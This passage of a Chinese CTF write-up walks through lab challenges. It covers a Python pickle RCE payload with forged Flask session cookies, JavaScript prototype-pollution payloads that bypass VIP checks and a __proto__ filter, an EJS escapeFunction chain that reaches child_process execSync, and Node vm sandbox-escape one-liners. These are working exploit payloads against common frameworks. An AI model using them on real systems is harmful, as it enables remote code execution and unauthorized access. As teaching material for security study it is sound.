class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>,))<br><br>a = Rce()<br>payload_b64 = b2a_base64(pickle.dumps(a)).decode().strip()<br><span class="hljs-built_in">print</span>(payload_b64)<br><br><span class="hljs-comment"># 调试payload</span><br><span class="hljs-comment"># user_obj = pickle.loads(a2b_base64(payload_b64))</span><br><span class="hljs-comment"># 安全回显各种类型</span><br><span class="hljs-comment"># if user_obj is None:</span><br><span class="hljs-comment">#     print(&#x27;User is null.Check your session.&#x27;)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># print(user_obj)</span><br><span class="hljs-comment"># print(user_obj.username)</span><br><br><span class="hljs-comment"># 2. 生成 session cookie</span><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&quot;immatrix&quot;</span><br><span class="hljs-keyword">with</span> app.app_context():<br>    serializer = app.session_interface.get_signing_serializer(app)<br>    session_data = &#123;<span class="hljs-string">&#x27;user&#x27;</span>: payload_b64&#125;<br>    <span class="hljs-built_in">print</span>(session_data)<br>    session_cookie = serializer.dumps(session_data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] session cookie:&#x27;</span>, session_cookie)<br></code></pre></td></tr></table></figure>
+
+<p>运行脚本，直接生成session（当然，也可以用工具去session伪造，比如flask-session-cookie-manager）</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gASVRgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwqX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IC9mbGFnJykucmVhZCgplIWUUpQu<br>&#123;<span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;gASVRgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwqX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IC9mbGFnJykucmVhZCgplIWUUpQu&#x27;</span>&#125;<br><span class="hljs-selector-attr">[*]</span> session cookie: eyJ1c2VyIjoiZ0FTVlJnQUFBQUFBQUFDTUNHSjFhV3gwYVc1emxJd0VaWFpoYkpTVGxJd3FYMTlwYlhCdmNuUmZYeWduYjNNbktTNXdiM0JsYmlnblkyRjBJQzltYkdGbkp5a3VjbVZoWkNncGxJV1VVcFF1In0<span class="hljs-selector-class">.aKbchA</span>.<span class="hljs-number">6</span>BxgvVzMr9dKvR5dTTjRE68AZuQ<br></code></pre></td></tr></table></figure>
+
+<p>写入session</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148606.png" srcset="/img/loading.gif" lazyload alt="image-20250821164900039"></p>
+<p>刷新</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148573.png" srcset="/img/loading.gif" lazyload alt="image-20250821164920454"></p>
+<h1 id="污染入门：权限劫持"><a href="#污染入门：权限劫持" class="headerlink" title="污染入门：权限劫持"></a>污染入门：权限劫持</h1><p>题目介绍</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">传说中的 <span class="hljs-keyword">JavaScript </span>世界，vip 权限高高在上，普通用户望尘莫及。但在黑暗的角落，污染隐隐作祟，不安的气息悄然蔓延。你能否发现这条隐秘通道，悄无声息地扩散污染，最终窃取 vip 的权杖，掌控至高无上的权限？<br></code></pre></td></tr></table></figure>
+
+<p>本题考点：</p>
+<ul>
+<li>常见信息收集之查看源代码</li>
+<li>原型链污染</li>
+</ul>
+<blockquote>
+<p>模拟情景：node.js学习平台开课了，只有VIP才能获取课程兑换码，通过原型链污染劫持VIP，拿到课程兑换码（flag）</p>
+<p>题目评析：</p>
+<p>了解常见的信息收集方式：右键查看源代码</p>
+<p>对原型链污染有一个简单了解，理解原型链污染原理</p>
+</blockquote>
+<p>进去之后是一个Node.js VIP培训课程兑换中心</p>
+<p>点击<code>获取课程兑换码</code></p>
+<p>显示：您不是VIP用户。（试试右键——&gt;查看页面源代码，有提示哦！）</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148992.png" srcset="/img/loading.gif" lazyload alt="image-20250821172307296"></p>
+<p>右键查看源代码</p>
+<p>给了hint</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148166.png" srcset="/img/loading.gif" lazyload alt="image-20250821172706033"></p>
+<p>结合题目描述，问AI可以知道是原型链污染，并且已经有提示是污染user.vip</p>
+<p>payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>       <span class="hljs-attr">&quot;vip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>   <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>用burp抓包传参即可</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148141.png" srcset="/img/loading.gif" lazyload alt="image-20250821173308648"></p>
+<p>非常入门的题，其实AI可以直接解出来</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148801.png" srcset="/img/loading.gif" lazyload alt="image-20250821173030528"></p>
+<p>这道题看着复杂，实际上POST传递一个参数就行。</p>
+<p>在本题的设计下，用ai的话是可以直接出payload的，json框架也都写好了，抓包之后看到是json，填上就行，动手难点就在于POST传参了。</p>
+<p>因此，这道题是一个套了壳的GET、POST题目。但是直接出常规题太俗了，如果说能与Web安全实际知识点进行结合，或许更有效果。</p>
+<p>所以说，懂一点就能做，但是又可以深入学习，为实际知识提供入手点，是本题的出题目标。</p>
+<p>我们来讲一下不结合AI是怎么分析的。</p>
+<p>对于了解Node.js的同学，应该一看题目：污染，就知道是原型链的问题了，然后看到hint，可以明白是检查user类（实际上没有类，是语法糖）的vip是否为true，进而用payload解出题目。</p>
+<h1 id="污染联动：模板魔法"><a href="#污染联动：模板魔法" class="headerlink" title="污染联动：模板魔法"></a>污染联动：模板魔法</h1><p>题目介绍</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">污染风暴席卷而来，原型链的暗流与引擎的魔力交织，一切变得扑朔迷离。唯有最敏锐的黑客，才能在这复杂联动中寻觅突破口。你的任务不仅是蔓延污染，还需巧妙利用模板引擎的奥秘，触发隐藏的漏洞，让污染的力量无限放大！<br></code></pre></td></tr></table></figure>
+
+<p>本题考点：</p>
+<ul>
+<li>常见信息收集之查看源代码</li>
+<li>原型链污染、命令执行</li>
+<li>模板引擎触发</li>
+</ul>
+<blockquote>
+<p>模拟情景：node.js开课成功，因此开放了课程评价中心，评价内容实时渲染。再次利用原型链污染，通过ejs模板引擎触发，实现任意代码执行。</p>
+<p>题目评析：</p>
+<p>了解常见的信息收集方式：右键查看源代码、查找开源项目代码。</p>
+<p>深入理解原型链污染原理，掌握原型链污染实现任意代码执行的方法</p>
+<p>调试ejs模板引擎，掌握模板引擎链的调试方法，对原型链污染的触发有更深刻的体会</p>
+<p>作为第二轮的防AK题，本题是”污染“系列难度之最，极其考验选手的信息收集能力，尤其强调代码审计能力及调试能力。</p>
+</blockquote>
+<p>承接该系列背景，是一个课程评价网站。看题目应该知道还是原型链污染。</p>
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152148134.png" srcset="/img/loading.gif" lazyload alt="image-20250821174024668" style="zoom:50%;" />
+
+<p>依旧右键查看源代码</p>
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149670.png" srcset="/img/loading.gif" lazyload alt="image-20250821174140961" style="zoom:67%;" />
+
+<p>发现一个关键点：<code>npm install body-parser@^1.20.2 ejs@^3.1.9 express@^4.18.2</code>，这是用<code>npm</code>下载本题依赖的命令。</p>
+<blockquote>
+<p>这里其实有两个关键词：第一个原型链污染，这个不用提了，是本系列题目的主旨；第二个是模板引擎，这个结合题目以及题目描述，很多同学都能总结出来。</p>
+<p>但是很多同学看到模板引擎以为是SSTI，忽略了结合这两个关键词。</p>
+</blockquote>
+<p>其实搜这两个关键词就能给出大致的思路，就是ejs模板引擎触发原型链污染。</p>
+<p>payload如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;);&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;compileDebug&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;111&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后抓包看一下，发现不是json传输</p>
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149723.png" srcset="/img/loading.gif" lazyload alt="image-20250821174909708" style="zoom:50%;" />
+
+<p>所以细节在于需要改<code>Content-Type</code>为json，然后用json格式传payload</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149785.png" srcset="/img/loading.gif" lazyload alt="image-20250819204623979"></p>
+<p>大家要是真正理解第一题”污染入门“，就知道原型链污染本身是不能命令执行的，仅仅是改变了属性的值；如果要命令执行，还需要去触发，也就是执行污染过后的值。</p>
+<p>结合题目描述，要是了解过原型链污染常见利用手法，会自然的想到模板引擎触发原型链污染，然后可以去网上搜payload。找payload这一步比较困难，需要多信息收集、多尝试。</p>
+<p>当然这里给了ejs版本，你可以自己部署，结合网上的文章去调试。**不是只有直接给源代码才叫白盒，用了开源组件也是白盒。**因为直接给了npm下载安装的命令，结合一下ai，写个merge函数就可以跑本地。</p>
+<p>我们来解释上面payload，其实就是实现了：</p>
+<blockquote>
+<p>将<code>client</code>污染为<code>true</code>；</p>
+<p>将<code>escapeFunction</code>污染为<code>1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;);</code>，这是一个代码执行，本质就是通过代码执行<code>cat /flag</code>命令；</p>
+<p>将<code>compileDebug</code>污染为<code>true</code>。</p>
+</blockquote>
+<p>本题代码：<a target="_blank" rel="noopener" href="https://github.com/sangnigege/PrototypePollutionLab">sangnigege&#x2F;PrototypePollutionLab: PrototypePollutionLab 是一个开源的原型链污染漏洞靶场，它收录了HCTF2025中一系列CTF题目、源码及Docker环境，旨在帮助用户学习和复现相关漏洞。</a></p>
+<p>然后我们深入一下原理，看看模板引擎是怎么触发我们的原型链污染的。需要本地跑一下这个题的代码，这里是用VScode配合Node.js进行调试。</p>
+<p>我们在渲染处下断点，也就是在<code> res.render(&#39;review&#39;, renderCtx);</code>下断点，</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149854.png" srcset="/img/loading.gif" lazyload alt="image-20250818201946965"></p>
+<p>然后触发渲染：这里用bp传payload即可触发</p>
+<p>payload改成了弹计算器<code>1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;calc&#39;);</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149833.png" srcset="/img/loading.gif" lazyload alt="image-20250818202242117"></p>
+<p>会在断点处停下，也就是<code>res.render</code>处停下</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149471.png" srcset="/img/loading.gif" lazyload alt="image-20250818202208064"></p>
+<p>按F11或者调试窗口的单步调试，进入response.js模块，</p>
+<blockquote>
+<p> Express 的 res对象是由 response.js 定义和扩展的，render 方法最终会调用模板引擎（如 ejs）进行页面渲染。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149143.png" srcset="/img/loading.gif" lazyload alt="image-20250818192133071"></p>
+<p>继续单步调试，审计本题源代码可以发现，merge函数（原型链污染处）在<code>res.render</code>渲染之前，所以merge函数在断点之前就已经执行，也就是说<code>res.render</code>中opts这里传递的是污染成功的prototype</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149054.png" srcset="/img/loading.gif" lazyload alt="image-20250818202433183"></p>
+<p>继续往下，</p>
+<p>response.js中，将污染后的opts传给了app.render模块，</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149705.png" srcset="/img/loading.gif" lazyload alt="image-20250818203935363"></p>
+<p>我们继续跟进，找到能调用escapeFunction的地方</p>
+<p>接下来进入applicattion.js，然后一直调试，直到找到tryRender模块（也可以下个断点直接过来，这个调试技巧下面经常用到），这里也是来调用ejs模块进行渲染，</p>
+<p>发现前面污染的opts传给了renderOptions</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149180.png" srcset="/img/loading.gif" lazyload alt="image-20250818210506853"></p>
+<p>跟进tryRender，然后在tryRender中跟进view.render方法，options显然是被原型链污染了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149681.png" srcset="/img/loading.gif" lazyload alt="image-20250818210733620"></p>
+<p>继续调试，进入view.js，我们就发现了engine引擎这个关键字，</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149203.png" srcset="/img/loading.gif" lazyload alt="image-20250818211206766"></p>
+<p>然后进入this.engine里面，就最终进入到了ejs.js的模块当中，调用ejs.js的入口函数renderFile，renderFile函数最后return tryHandleCache，直接加断点跳过来</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149593.png" srcset="/img/loading.gif" lazyload alt="image-20250818211700809"></p>
+<p>我们跟进tryHandleCache函数，进入handleCache函数中</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149912.png" srcset="/img/loading.gif" lazyload alt="image-20250818211939095"></p>
+<p>在handleCache模块当中我们看到exports.compile模块，可以看到我们要渲染的index.ejs被渲染到compile函数当中，options是被污染的</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149487.png" srcset="/img/loading.gif" lazyload alt="image-20250818213603634"></p>
+<p>继续跟进compile函数，函数在最后<code>renturn templ.compile()</code>：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149163.png" srcset="/img/loading.gif" lazyload alt="image-20250818213733507"></p>
+<p>继续跟进，然后我们就进入到了模板引擎调用的部分，</p>
+<p>往下找一找，会发现有大量的渲染拼接（有很多别的触发方法，我们这里只讲escapeFunction）</p>
+<p>发现这里有两个if要过，所以将<code>client</code>污染为<code>true</code>、将<code>compileDebug</code>污染为<code>true</code>。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149276.png" srcset="/img/loading.gif" lazyload alt="image-20250818214722230"></p>
+<p>下断点跳到这里看看，可以看到src的值里面成功注入了我们的恶意代码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149101.png" srcset="/img/loading.gif" lazyload alt="image-20250818215120082"></p>
+<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs r">`escapeFn = escapeFn || 1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;);;\nvar __line = 1\n  , __lines = &quot;&lt;!DOCTYPE html&gt;\\r\\n&lt;html lang=\\&quot;zh\\&quot;&gt;\\r\\n&lt;head&gt;\\r\\n    &lt;meta charset=\\&quot;UTF-8\\&quot;&gt;\\r\\n    &lt;title&gt;Node.js VIP课程评价中心 - 学员留言专区&lt;/title&gt;\\r\\n    &lt;style&gt;\\r\\n        html, body &#123; height: 100%; &#125;\\r\\n        body &#123;\\r\\n            font-family: &#x27;Segoe UI&#x27;, &#x27;微软雅黑&#x27;, Arial, sans-serif;\\r\\n            background: linear-gradient(120deg,#e0eafc 0%,#cfdef3 100%);\\r\\n        … __append(escapeFn( item ))\n    ; __append(&quot;&lt;/div&gt;\\r\\n                &lt;div class=\\&quot;review-item\\&quot;&gt;&quot;)\n    ; __line = 80\n    ; __append( item )\n    ; __append(&quot;&lt;/div&gt;\\r\\n\\r\\n            &quot;)\n    ; __line = 82\n    ;  &#125;) \n    ; __append(&quot;\\r\\n        &lt;/div&gt;\\r\\n    &lt;/div&gt;\\r\\n    &lt;div class=\\&quot;footer\\&quot;&gt;© 2025 IT Training Node.js课程中心 | 商业合作请联系：it-training@example.com&lt;/div&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;&quot;)\n    ; __line = 87\n  &#125;\n  return __output;\n&#125; catch (e) &#123;\n  rethrow(e, __lines, __filename, __line, escapeFn);\n&#125;\n`<br><br></code></pre></td></tr></table></figure>
+
+<p>稍稍整理一下，容易看一些</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">escapeFn = escapeFn || 1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;);;<br>var __line = 1<br>  , __lines = &quot;&lt;!DOCTYPE html&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n&lt;html lang=<span class="hljs-symbol">\\</span>&quot;zh<span class="hljs-symbol">\\</span>&quot;&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n&lt;head&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n    &lt;meta charset=<span class="hljs-symbol">\\</span>&quot;UTF-8<span class="hljs-symbol">\\</span>&quot;&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n    &lt;title&gt;Node.js VIP课程评价中心 - 学员留言专区&lt;/title&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n    &lt;style&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n        html, body &#123; height: 100%; &#125;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n        body &#123;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n            font-family: &#x27;Segoe UI&#x27;, &#x27;微软雅黑&#x27;, Arial, sans-serif;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n            background: linear-gradient(120deg,#e0eafc 0%,#cfdef3 100%);<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n        … __append(escapeFn( item ))<br>    ; __append(&quot;&lt;/div&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n                &lt;div class=<span class="hljs-symbol">\\</span>&quot;review-item<span class="hljs-symbol">\\</span>&quot;&gt;&quot;)<br>    ; __line = 80<br>    ; __append( item )<br>    ; __append(&quot;&lt;/div&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n            &quot;)<br>    ; __line = 82<br>    ;  &#125;) <br>    ; __append(&quot;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n        &lt;/div&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n    &lt;/div&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n    &lt;div class=<span class="hljs-symbol">\\</span>&quot;footer<span class="hljs-symbol">\\</span>&quot;&gt;© 2025 IT Training Node.js课程中心 | 商业合作请联系：it-training@example.com&lt;/div&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n&lt;/body&gt;<span class="hljs-symbol">\\</span>r<span class="hljs-symbol">\\</span>n&lt;/html&gt;&quot;)<br>    ; __line = 87<br>  &#125;<br>  return __output;<br>&#125; catch (e) &#123;<br>  rethrow(e, __lines, __filename, __line, escapeFn);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>上面其实是编译成的 JavaScript 代码，我们恶意代码包含其中。</p>
+<p>这里我们提一下<code>ejs</code>渲染的大致流程：</p>
+<blockquote>
+<p><code>.ejs</code>模板 → 被EJS编译成一大段 JavaScript 代码 → 构造一个大JS函数（<strong>渲染函数</strong>）→ 执行渲染函数，输出HTML</p>
+</blockquote>
+<p>注意，上面一大串代码还会继续补充完整，然后再用 <code>Function</code> 或 <code>AsyncFunction</code> 将其构造成渲染函数。如果要了解渲染函数的具体构造过程，可以继续往下审计代码，发现最后<code>returnedFn</code> 会调用 <code>fn.apply(...)</code>，而 <code>fn </code>就是你模板编译出来的 大JS 函数（包含所有模板和 <code>escapeFn</code> 的调用）。当然，具体细节这里无关紧要，懂得大致流程就行。</p>
+<p>目前我们的恶意代码是插入了编译成的 JavaScript 代码中，进一步这个恶意代码会污染渲染函数中的一个“工具函数”——escapeFn</p>
+<p><strong>可以简单理解为：我们插入的恶意代码，最终会成为大函数的一部分（即大函数中的一个小函数），然后这个大函数会被执行，因此我们的恶意代码自然也会被执行（即大函数里面会调用我们这个小函数）。</strong></p>
+<p>成功注入的代码片段为：</p>
+<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gml">escapeFn = escapeFn || <span class="hljs-number">1</span>; <br><span class="hljs-keyword">return</span> <span class="hljs-symbol">global</span>.process.mainModule.<span class="hljs-keyword">constructor</span>._load(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;calc&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>当模板调用 <code>&lt;%- item %&gt;</code> 时，会调用 <code>escapeFn(item)</code>。</li>
+<li>由于原型污染，escapeFn变成了你的恶意函数体，导致执行了 <code>execSync(&#39;calc&#39;)</code>，本地应该会弹计算器。</li>
+</ul>
+<p>整个过程看着复杂，其实一直在跟着污染之后的代码走，把握这个主线，再有一些调试技巧即可。</p>
+<h1 id="污染终极：越狱之路"><a href="#污染终极：越狱之路" class="headerlink" title="污染终极：越狱之路"></a>污染终极：越狱之路</h1><p>题目介绍</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">污染之力在握，vip权杖仍可窃取，代码亦可随心执行。然而，一切皆是虚妄，沙箱的牢笼坚不可摧，将你的野心死死束缚。真正的高手绝不止步于此——你能否冲破沙箱的重重壁垒，成功越狱，彻底掌控整台服务器？终极挑战，等你来战！<br></code></pre></td></tr></table></figure>
+
+<p>本题考点：</p>
+<ul>
+<li>常见信息收集之查看源代码</li>
+<li>原型链污染绕过</li>
+<li>node.js内置模块vm之沙箱逃逸</li>
+</ul>
+<blockquote>
+<p>模拟情景：node.js学习平台开课之后，还提供了一个代码练习平台（光教不练怎么能行）。依然是VIP才能练习，在有过滤的情况下，原型链污染劫持VIP，进入代码练习平台。可以做到任意代码执行，但是做不到任意命令执行（代码练习平台有沙箱，实际调用了node.js内置模块vm），沙箱逃逸从而命令执行</p>
+<p>题目评析：</p>
+<p>了解常见的信息收集方式：右键查看源代码</p>
+<p>原型链污染常见的过滤与绕过</p>
+<p>了解node.js内置模块vm的沙箱机制，从多角度学习vm沙箱逃逸手法，为后续学习vm2沙箱逃逸提供入手点。</p>
+</blockquote>
+<p>承接该系列背景，是一个代码练习平台</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149115.png" srcset="/img/loading.gif" lazyload alt="image-20250821180619443"></p>
+<p>点击<code>在线练习代码</code></p>
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149944.png" srcset="/img/loading.gif" lazyload alt="image-20250821181508669" style="zoom:50%;" />
+
+<p>依旧右键查看源代码（hint似乎说的稀里糊涂的，不要急，继续往下</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149067.png" srcset="/img/loading.gif" lazyload alt="image-20250821181543503"></p>
+<p>但是看来和<code>污染入门：权限劫持</code>这一题一样，都是劫持VIP。不管了，试试<code>污染入门：权限劫持</code>的payload</p>
+<p>回显false</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149769.png" srcset="/img/loading.gif" lazyload alt="image-20250821181806812"></p>
+<p>这里可以burp放包，会有弹窗</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149522.png" srcset="/img/loading.gif" lazyload alt="image-20250821181934482"></p>
+<p>而且回显</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149476.png" srcset="/img/loading.gif" lazyload alt="image-20250821182001650"></p>
+<p>这时再结合题目hint，知道应该是过滤了<code>__proto__</code></p>
+<p>这里用一种别的方式污染，payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;vip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>抓包传payload即可</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149988.png" srcset="/img/loading.gif" lazyload alt="image-20250819035448764"></p>
+<p>再点击<code>在线练习代码</code>，成功进入代码练习平台</p>
+<p>发现可以任意代码执行</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152149640.png" srcset="/img/loading.gif" lazyload alt="image-20250821182252345"></p>
+<p>但是不能做到任意命令执行（代码练习平台肯定有一定防护</p>
+<p>这道题的难点就在于要结合题目描述，知道是沙箱逃逸（题目名称有“越狱”、题目介绍有“沙箱”</p>
+<p>这里用的是node.js内置模块vm，早被打烂了，逃逸方法有很多，列举部分：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 经典 Function 构造器链：通过 this.constructor.constructor 获得 Function 构造器，进而访问 Node.js 内部对象</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>).<span class="hljs-title function_">toString</span>())<br><br><span class="hljs-comment">// 构造器链变种：在获得 Function 构造器后，枚举其属性，判断是否有 execSync，若有则执行命令</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">constructor</span>.<span class="hljs-title 